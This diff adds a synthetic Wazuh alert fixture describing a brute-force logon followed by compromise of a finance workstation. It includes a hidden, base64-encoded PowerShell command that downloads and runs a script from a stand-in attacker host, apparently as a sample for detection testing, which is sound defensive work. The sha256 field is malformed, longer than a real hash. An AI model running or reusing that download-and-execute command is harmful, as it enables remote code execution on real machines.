@@ -1,0 +1,48 @@
+{
+  "source": "wazuh-synthetic",
+  "alerts": [
+    {
+      "rule": {"id": "100201", "level": 10, "description": "Multiple failed logon attempts detected", "groups": ["authentication_failed"], "mitre": {"id": ["T1110"]}},
+      "agent": {"name": "WKSTN-FIN-07", "ip": "10.20.4.15"},
+      "data": {"event_type": "authentication_failure", "win": {"eventdata": {"targetUserName": "j.rahman", "ipAddress": "185.220.101.47"}}, "hostname": "WKSTN-FIN-07"},
+      "full_log": "2026-09-05T09:12:01Z WKSTN-FIN-07 Security[4625] An account failed to log on. Account Name: j.rahman Source Network Address: 185.220.101.47",
+      "timestamp": "2026-09-05T09:12:01+00:00"
+    },
+    {
+      "rule": {"id": "100201", "level": 10, "description": "Multiple failed logon attempts detected", "groups": ["authentication_failed"], "mitre": {"id": ["T1110"]}},
+      "agent": {"name": "WKSTN-FIN-07", "ip": "10.20.4.15"},
+      "data": {"event_type": "authentication_failure", "win": {"eventdata": {"targetUserName": "j.rahman", "ipAddress": "185.220.101.47"}}, "hostname": "WKSTN-FIN-07"},
+      "full_log": "2026-09-05T09:12:44Z WKSTN-FIN-07 Security[4625] An account failed to log on. Account Name: j.rahman Source Network Address: 185.220.101.47",
+      "timestamp": "2026-09-05T09:12:44+00:00"
+    },
+    {
+      "rule": {"id": "100201", "level": 10, "description": "Multiple failed logon attempts detected", "groups": ["authentication_failed"], "mitre": {"id": ["T1110"]}},
+      "agent": {"name": "WKSTN-FIN-07", "ip": "10.20.4.15"},
+      "data": {"event_type": "authentication_failure", "win": {"eventdata": {"targetUserName": "j.rahman", "ipAddress": "185.220.101.47"}}, "hostname": "WKSTN-FIN-07"},
+      "full_log": "2026-09-05T09:13:02Z WKSTN-FIN-07 Security[4625] An account failed to log on. Account Name: j.rahman Source Network Address: 185.220.101.47",
+      "timestamp": "2026-09-05T09:13:02+00:00"
+    },
+    {
+      "rule": {"id": "100202", "level": 5, "description": "Successful logon following prior failures", "groups": ["authentication_success"], "mitre": {"id": ["T1078"]}},
+      "agent": {"name": "WKSTN-FIN-07", "ip": "10.20.4.15"},
+      "data": {"event_type": "authentication_success", "win": {"eventdata": {"targetUserName": "j.rahman", "ipAddress": "185.220.101.47"}}, "hostname": "WKSTN-FIN-07"},
+      "full_log": "2026-09-05T09:13:19Z WKSTN-FIN-07 Security[4624] An account was successfully logged on. Account Name: j.rahman Source Network Address: 185.220.101.47",
+      "timestamp": "2026-09-05T09:13:19+00:00"
+    },
+    {
+      "rule": {"id": "100301", "level": 15, "description": "Suspicious encoded PowerShell execution detected (T1059.001)", "groups": ["process_execution", "powershell"], "mitre": {"id": ["T1059.001", "T1027"]}},
+      "agent": {"name": "WKSTN-FIN-07", "ip": "10.20.4.15"},
+      "data": {"event_type": "process_creation", "win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAuAGIAYQBkAGcAdQB5AC4AbgBlAHQALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="}}, "hostname": "WKSTN-FIN-07"},
+      "full_log": "2026-09-05T09:14:07Z WKSTN-FIN-07 Sysmon[1] ProcessCreate: powershell.exe -nop -w hidden -enc SQBFAFgA... DownloadString('http://evil-c2.badguy.net/payload.ps1') ParentImage=explorer.exe",
+      "timestamp": "2026-09-05T09:14:07+00:00"
+    },
+    {
+      "rule": {"id": "100302", "level": 12, "description": "Outbound connection to known-bad infrastructure", "groups": ["network", "c2"], "mitre": {"id": ["T1071.001", "T1105"]}},
+      "agent": {"name": "WKSTN-FIN-07", "ip": "10.20.4.15"},
+      "data": {"event_type": "network_connection", "win": {"eventdata": {"destinationIp": "185.220.101.47", "destinationHostname": "evil-c2.badguy.net"}}, "hostname": "WKSTN-FIN-07"},
+      "full_log": "2026-09-05T09:14:09Z WKSTN-FIN-07 Sysmon[3] NetworkConnect: powershell.exe -> evil-c2.badguy.net (185.220.101.47:443) sha256=8f14e45fceea167a5a36dedd4bea2543dc5c4e6b0a55f8e0c8e5d2f4a1b3c7d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b"
+      ,
+      "timestamp": "2026-09-05T09:14:09+00:00"
+    }
+  ]
+}
